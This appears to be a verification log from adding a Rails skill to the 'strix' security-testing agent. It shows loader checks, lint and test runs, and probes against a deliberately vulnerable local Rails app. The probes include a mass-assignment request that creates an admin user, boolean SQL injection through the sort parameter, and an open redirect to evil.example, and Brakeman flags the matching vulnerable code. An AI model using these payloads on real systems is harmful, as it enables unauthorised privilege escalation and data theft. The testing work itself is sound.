@@ -1,0 +1,317 @@
+===== BEFORE: frameworks skill list and loader (rails.md hidden) =====
+$ ls strix/skills/frameworks/
+django.md
+fastapi.md
+nestjs.md
+nextjs.md
+exit 0
+
+$ uv run python -c "from strix.skills import get_all_skill_names, get_available_skills, validate_requested_skills; print('rails in names:', 'rails' in get_all_skill_names()); print('frameworks:', [s['name'] for s in get_available_skills().get('frameworks', [])]); print('validate rails:', validate_requested_skills(['rails']))"
+rails in names: False
+frameworks: ['django', 'fastapi', 'nestjs', 'nextjs']
+validate rails: Invalid skill name(s): ['rails']. Available skills: ['active_directory', 'agent_browser', 'agentic_system_security', 'api_spec_testing', 'argument_injection', 'asset_discovery', 'auth0', 'authentication_jwt', 'aws', 'azure', 'broken_function_level_authorization', 'browser_security', 'business_logic', 'csrf', 'dependency_cve_scanning', 'django', 'electron_desktop_apps', 'fastapi', 'ffuf', 'firebase', 'gcp', 'grafana_prometheus', 'graphql', 'header_injection', 'http_request_smuggling', 'httpx', 'hurl', 'hypothesis', 'idor', 'information_disclosure', 'infrastructure_lifecycle', 'insecure_deserialization', 'insecure_file_uploads', 'katana', 'kubernetes', 'llm_applications', 'llm_prompt_injection', 'mass_assignment', 'naabu', 'nestjs', 'nextjs', 'nmap', 'nosql_injection', 'npx_confusion', 'nuclei', 'oauth', 'open_redirect', 'opengrep', 'path_traversal_lfi_rfi', 'prototype_pollution', 'python', 'query_language_injection', 'race_conditions', 'rce', 'semantic_confusion', 'source_aware_sast', 'sql_injection', 'sqlmap', 'ssrf', 'ssti', 'subdomain_takeover', 'subfinder', 'supabase', 'weak_password_detection', 'xss', 'xxe']
+exit 0
+
+===== AFTER: skill present, loader, prompt injection, refusal =====
+$ ls strix/skills/frameworks/
+django.md
+fastapi.md
+nestjs.md
+nextjs.md
+rails.md
+exit 0
+
+$ uv run python -c "
+from strix.skills import get_all_skill_names, get_available_skills, load_skills, validate_requested_skills
+from strix.agents.prompt import render_system_prompt
+print('rails in names:', 'rails' in get_all_skill_names())
+print('frameworks:', [s['name'] for s in get_available_skills()['frameworks']])
+print('validate rails:', validate_requested_skills(['rails']))
+print('validate nope:', validate_requested_skills(['nope']))
+body = load_skills(['rails'])['rails']
+print('loaded chars:', len(body))
+print('has permit!:', 'permit!' in body)
+prompt = render_system_prompt(skills=['rails'], include_scope=False)
+print('prompt has <rails>:', '<rails>' in prompt)
+print('prompt has permit! in requested skill:', 'permit!' in prompt.split('<cache_point>')[-1])
+print('available_skills lists frameworks/rails:', 'frameworks/rails:' in prompt)
+print('django same shape:', '<django>' in render_system_prompt(skills=['django'], include_scope=False))
+"
+rails in names: True
+frameworks: ['django', 'fastapi', 'nestjs', 'nextjs', 'rails']
+validate rails: None
+validate nope: Invalid skill name(s): ['nope']. Available skills: ['active_directory', 'agent_browser', 'agentic_system_security', 'api_spec_testing', 'argument_injection', 'asset_discovery', 'auth0', 'authentication_jwt', 'aws', 'azure', 'broken_function_level_authorization', 'browser_security', 'business_logic', 'csrf', 'dependency_cve_scanning', 'django', 'electron_desktop_apps', 'fastapi', 'ffuf', 'firebase', 'gcp', 'grafana_prometheus', 'graphql', 'header_injection', 'http_request_smuggling', 'httpx', 'hurl', 'hypothesis', 'idor', 'information_disclosure', 'infrastructure_lifecycle', 'insecure_deserialization', 'insecure_file_uploads', 'katana', 'kubernetes', 'llm_applications', 'llm_prompt_injection', 'mass_assignment', 'naabu', 'nestjs', 'nextjs', 'nmap', 'nosql_injection', 'npx_confusion', 'nuclei', 'oauth', 'open_redirect', 'opengrep', 'path_traversal_lfi_rfi', 'prototype_pollution', 'python', 'query_language_injection', 'race_conditions', 'rails', 'rce', 'semantic_confusion', 'source_aware_sast', 'sql_injection', 'sqlmap', 'ssrf', 'ssti', 'subdomain_takeover', 'subfinder', 'supabase', 'weak_password_detection', 'xss', 'xxe']
+loaded chars: 13390
+has permit!: True
+prompt has <rails>: True
+prompt has permit! in requested skill: True
+available_skills lists frameworks/rails: True
+django same shape: True
+exit 0
+
+===== REPO CHECKS =====
+$ uv run ruff format --check .
+255 files already formatted
+exit 0
+
+$ uv run ruff check .
+[1;32mAll checks passed![0m
+exit 0
+
+$ uv run mypy strix/
+pyproject.toml: note: unused section(s): module = ['tests.*']
+Success: no issues found in 137 source files
+exit 0
+
+$ uv run bandit -r strix/ -c pyproject.toml
+[main]	INFO	profile include tests: None
+[main]	INFO	profile exclude tests: B601,B603,B101,B404,B607
+[main]	INFO	cli include tests: None
+[main]	INFO	cli exclude tests: None
+[main]	INFO	using config: pyproject.toml
+[main]	INFO	running on Python 3.12.3
+[manager]	WARNING	Test in comment: URL is not a test name or id, ignoring
+[manager]	WARNING	Test in comment: not is not a test name or id, ignoring
+[manager]	WARNING	Test in comment: a is not a test name or id, ignoring
+[manager]	WARNING	Test in comment: secret is not a test name or id, ignoring
+[manager]	WARNING	Test in comment: boolean is not a test name or id, ignoring
+[manager]	WARNING	Test in comment: flag is not a test name or id, ignoring
+[manager]	WARNING	Test in comment: not is not a test name or id, ignoring
+[manager]	WARNING	Test in comment: a is not a test name or id, ignoring
+[manager]	WARNING	Test in comment: secret is not a test name or id, ignoring
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:179
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:180
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:181
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:182
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:183
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:184
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:185
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:187
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:188
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:179
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:184
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:186
+[tester]	WARNING	nosec encountered (B105), but no failed test on file strix/config/codex.py:187
+[tester]	WARNING	nosec encountered (B606), but no failed test on file strix/interface/update_check.py:294
+[tester]	WARNING	nosec encountered (B104), but no failed test on file strix/interface/utils.py:1461
+[tester]	WARNING	nosec encountered (B104), but no failed test on file strix/interface/utils.py:1461
+[manager]	WARNING	Test in comment: prompts is not a test name or id, ignoring
+[manager]	WARNING	Test in comment: not is not a test name or id, ignoring
+[manager]	WARNING	Test in comment: HTML is not a test name or id, ignoring
+Working... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:01
+
+Run started:2026-11-15 17:41:06.695011+00:00
+
+Test results:
+	No issues identified.
+
+Code scanned:
+	Total lines of code: 38352
+	Total lines skipped (#nosec): 0
+	Total potential issues skipped due to specifically being disabled (e.g., #nosec BXXX): 12
+
+Run metrics:
+	Total issues (by severity):
+		Undefined: 0
+		Low: 0
+		Medium: 0
+		High: 0
+	Total issues (by confidence):
+		Undefined: 0
+		Low: 0
+		Medium: 0
+		High: 0
+Files skipped (0):
+exit 0
+
+===== SKILL TESTS =====
+$ uv run pytest -q --tb=line tests/test_skill_dir_extension.py tests/test_runner_root_prompt.py tests/test_runner_mcp.py tests/test_finish_coverage_gate.py tests/test_report_coverage.py
+.............................................................F....       [100%]
+=================================== FAILURES ===================================
+E   AssertionError: add ledger phrasings for: ['query_language_injection']
+    assert not {'query_language_injection'}
+/workspace/tests/test_report_coverage.py:209: AssertionError: add ledger phrasings for: ['query_language_injection']
+=========================== short test summary info ============================
+FAILED tests/test_report_coverage.py::test_every_vulnerability_skill_declares_its_phrasings
+1 failed, 65 passed in 5.11s
+exit 1
+
+===== FULL PYTEST SUMMARY (saved run) =====
+$ tail -n 20 /tmp/strix-check/pytest-main.txt
+........................................................................ [ 98%]
+........................                                                 [100%]
+=============================== warnings summary ===============================
+tests/test_cost_tracking.py::test_openrouter_stream_handler_records_cost
+tests/test_cost_tracking.py::test_openrouter_tallies_provider
+  /workspace/.venv/lib/python3.12/site-packages/pydantic/_internal/_generate_schema.py:1480: UserWarning: Item 'summary' on TypedDict class 'ChatCompletionReasoningItem' is using the `ReadOnly` qualifier. Pydantic will not protect items from any mutation on dictionary instances.
+    warnings.warn(
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED tests/test_budget_pause_policy.py::test_pause_policy_parks_every_agent_at_the_limit_and_resumes_in_place
+FAILED tests/test_budget_pause_policy.py::test_pause_policy_operator_pause_and_resume_without_a_limit
+FAILED tests/test_budget_pause_policy.py::test_pause_policy_keeps_in_flight_overshoot
+FAILED tests/test_budget_pause_policy.py::test_operator_pause_holds_under_the_stop_policy
+FAILED tests/test_budget_pause_policy.py::test_a_resume_that_lands_before_the_park_still_continues
+FAILED tests/test_e2e_budget_lifecycle.py::test_full_budget_lifecycle_reserve_then_cap
+FAILED tests/test_e2e_budget_lifecycle.py::test_respawned_children_after_reserve_never_spend
+FAILED tests/test_pricing.py::test_resolves_common_bare_model_names - assert ...
+FAILED tests/test_report_coverage.py::test_every_vulnerability_skill_declares_its_phrasings
+9 failed, 2175 passed, 2 warnings in 112.93s (0:01:52)
+exit 0
+
+$ tail -n 8 /tmp/strix-check/pytest-providers.txt
+
+tests/test_tool_call_ids_providers.py: 52 warnings
+  /workspace/.venv/lib/python3.12/site-packages/litellm/litellm_core_utils/model_response_utils.py:18: PydanticDeprecatedSince211: Accessing the 'model_fields' attribute on the instance is deprecated. Instead, you should access this attribute from the model class. Deprecated in Pydantic V2.11 to be removed in V3.0.
+    attribute: Final[_AttributeView] = {"value": getattr(source, name)}
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+357 passed, 3 xfailed, 105 warnings in 146.84s (0:02:26)
+OPENAI_API_KEY is not set, skipping trace export
+exit 0
+
+===== SEEDED RAILS APP PROBES =====
+$ curl -sS -o /dev/null -w 'up %{http_code}\n' http://127.0.0.1:3000/up
+up 200
+exit 0
+
+$ curl -sS http://127.0.0.1:3000/users?sort=id
+[{"id":1,"email":"zoe@example.com","name":"alice","admin":false,"created_at":"2026-11-15T17:18:32.397Z","updated_at":"2026-11-15T17:20:48.106Z","role":null},{"id":2,"email":"amy@example.com","name":"bob","admin":false,"created_at":"2026-11-15T17:18:32.401Z","updated_at":"2026-11-15T17:20:43.781Z","role":null}]exit 0
+
+
+$ curl -sS -D - -o /tmp/demo-post.json -X POST http://127.0.0.1:3000/users -H 'Content-Type: application/x-www-form-urlencoded' --data 'user[email]=a@x&user[admin]=true&user[role]=admin'
+HTTP/1.1 201 Created
+x-frame-options: SAMEORIGIN
+x-xss-protection: 0
+x-content-type-options: nosniff
+x-permitted-cross-domain-policies: none
+referrer-policy: strict-origin-when-cross-origin
+content-type: application/json; charset=utf-8
+vary: Accept
+etag: W/"be37764374de2bedaf6a37bd7130e26d"
+cache-control: max-age=0, private, must-revalidate
+x-request-id: acc0da0b-2ac1-470c-ad82-6bd64348fcbe
+x-runtime: 0.007060
+server-timing: start_processing.action_controller;dur=0.01, sql.active_record;dur=3.74, start_transaction.active_record;dur=0.00, transaction.active_record;dur=4.17, process_action.action_controller;dur=5.86
+content-length: 142
+
+exit 0
+
+
+{"id":4,"email":"a@x","name":null,"admin":true,"created_at":"2026-11-15T17:41:13.623Z","updated_at":"2026-11-15T17:41:13.623Z","role":"admin"}
+$ curl -sS http://127.0.0.1:3000/users?sort=CASE+WHEN+(SELECT+1)=1+THEN+email+ELSE+id+END
+bash: -c: line 1: syntax error near unexpected token `('
+bash: -c: line 1: `curl -sS http://127.0.0.1:3000/users?sort=CASE+WHEN+(SELECT+1)=1+THEN+email+ELSE+id+END'
+exit 2
+
+
+$ curl -sS http://127.0.0.1:3000/users?sort=CASE+WHEN+(SELECT+1)=0+THEN+email+ELSE+id+END
+bash: -c: line 1: syntax error near unexpected token `('
+bash: -c: line 1: `curl -sS http://127.0.0.1:3000/users?sort=CASE+WHEN+(SELECT+1)=0+THEN+email+ELSE+id+END'
+exit 2
+
+
+$ curl -sS -D - -o /dev/null http://127.0.0.1:3000/login?next=https://evil.example/
+HTTP/1.1 302 Found
+x-frame-options: SAMEORIGIN
+x-xss-protection: 0
+x-content-type-options: nosniff
+x-permitted-cross-domain-policies: none
+referrer-policy: strict-origin-when-cross-origin
+location: https://evil.example/
+content-type: text/html; charset=utf-8
+cache-control: no-cache
+x-request-id: 91c8a5b9-2fab-4156-8dcc-2d9619758ed1
+x-runtime: 0.001402
+server-timing: start_processing.action_controller;dur=0.01, redirect_to.action_controller;dur=0.07, process_action.action_controller;dur=0.17
+content-length: 0
+
+exit 0
+
+===== BRAKEMAN =====
+$ brakeman -q --no-pager -f text /tmp/vulnshop
+
+== Brakeman Report ==
+
+Application Path: /tmp/vulnshop
+Rails Version: 7.2.2
+Brakeman Version: 8.1.0
+Scan Date: 2026-11-15 17:41:14 +0000
+Duration: 0.117296325 seconds
+Checks Run: BasicAuth, BasicAuthTimingAttack, CSRFTokenForgeryCVE, ContentTag, CookieSerialization, CreateWith, CrossSiteScripting, DefaultRoutes, Deserialize, DetailedExceptions, DigestDoS, DynamicFinders, EOLRails, EOLRuby, EscapeFunction, Evaluation, Execute, FileAccess, FileDisclosure, FilterSkipping, ForgerySetting, HeaderDoS, I18nXSS, JRubyXML, JSONEncoding, JSONEntityEscape, JSONParsing, LinkTo, LinkToHref, MailTo, MassAssignment, MimeTypeDoS, ModelAttrAccessible, ModelAttributes, ModelSerialize, NestedAttributes, NestedAttributesBypass, NumberToCurrency, PageCachingCVE, Pathname, PermitAttributes, QuoteTableName, Ransack, Redirect, RegexDoS, Render, RenderDoS, RenderInline, RenderRCE, ResponseSplitting, RouteDoS, SQL, SQLCVEs, SSLVerify, SafeBufferManipulation, SanitizeConfigCve, SanitizeMethods, SelectTag, SelectVulnerability, Send, SendFile, SessionManipulation, SessionSettings, SimpleFormat, SingleQuotes, SkipBeforeFilter, SprocketsPathTraversal, StripTags, SymbolDoSCVE, TemplateInjection, TranslateBug, UnsafeReflection, UnsafeReflectionMethods, ValidationRegex, VerbConfusion, WeakRSAKey, WithoutProtection, XMLDoS, YAMLParsing
+
+== Overview ==
+
+Controllers: 3
+Models: 2
+Templates: 2
+Errors: 0
+Security Warnings: 6
+
+== Warning Types ==
+
+Mass Assignment: 2
+Redirect: 1
+SQL Injection: 1
+Unmaintained Dependency: 2
+
+== Warnings ==
+
+Confidence: High
+Category: Mass Assignment
+Check: MassAssignment
+Message: Specify exact keys allowed for mass assignment instead of using `permit!` which allows any keys
+Code: params.require(:user).permit!
+File: app/controllers/users_controller.rb
+Line: 8
+
+Confidence: High
+Category: Mass Assignment
+Check: MassAssignment
+Message: Specify exact keys allowed for mass assignment instead of using `permit!` which allows any keys
+Code: params.require(:user).permit!
+File: app/controllers/users_controller.rb
+Line: 14
+
+Confidence: High
+Category: SQL Injection
+Check: SQL
+Message: Possible SQL injection
+Code: Arel.sql("#{params[:sort]} #{(params[:dir] or "ASC")}")
+File: app/controllers/users_controller.rb
+Line: 3
+
+Confidence: High
+Category: Unmaintained Dependency
+Check: EOLRuby
+Message: Support for Ruby 3.2.3 ended on 2026-03-31
+File: .ruby-version
+Line: 1
+
+Confidence: High
+Category: Unmaintained Dependency
+Check: EOLRails
+Message: Support for Rails 7.2.2 ended on 2026-08-09
+File: Gemfile.lock
+Line: 140
+
+Confidence: Weak
+Category: Redirect
+Check: Redirect
+Message: Possible unprotected redirect
+Code: redirect_to(params[:next], :allow_other_host => true)
+File: app/controllers/sessions_controller.rb
+Line: 3
+
+exit 3
+
+DONE
+===== SQLI PROBES (quoted URLs) =====
+$ curl -sS http://127.0.0.1:3000/users\?sort=CASE+WHEN+\(SELECT+1\)=1+THEN+email+ELSE+id+END
+[{"id":4,"email":"a@x","name":null,"admin":true,"created_at":"2026-11-15T17:41:13.623Z","updated_at":"2026-11-15T17:41:13.623Z","role":"admin"},{"id":2,"email":"amy@example.com","name":"bob","admin":false,"created_at":"2026-11-15T17:18:32.401Z","updated_at":"2026-11-15T17:20:43.781Z","role":null},{"id":1,"email":"zoe@example.com","name":"alice","admin":false,"created_at":"2026-11-15T17:18:32.397Z","updated_at":"2026-11-15T17:20:48.106Z","role":null}]
+exit 0
+
+$ curl -sS http://127.0.0.1:3000/users\?sort=CASE+WHEN+\(SELECT+1\)=0+THEN+email+ELSE+id+END
+[{"id":1,"email":"zoe@example.com","name":"alice","admin":false,"created_at":"2026-11-15T17:18:32.397Z","updated_at":"2026-11-15T17:20:48.106Z","role":null},{"id":2,"email":"amy@example.com","name":"bob","admin":false,"created_at":"2026-11-15T17:18:32.401Z","updated_at":"2026-11-15T17:20:43.781Z","role":null},{"id":4,"email":"a@x","name":null,"admin":true,"created_at":"2026-11-15T17:41:13.623Z","updated_at":"2026-11-15T17:41:13.623Z","role":"admin"}]
+exit 0
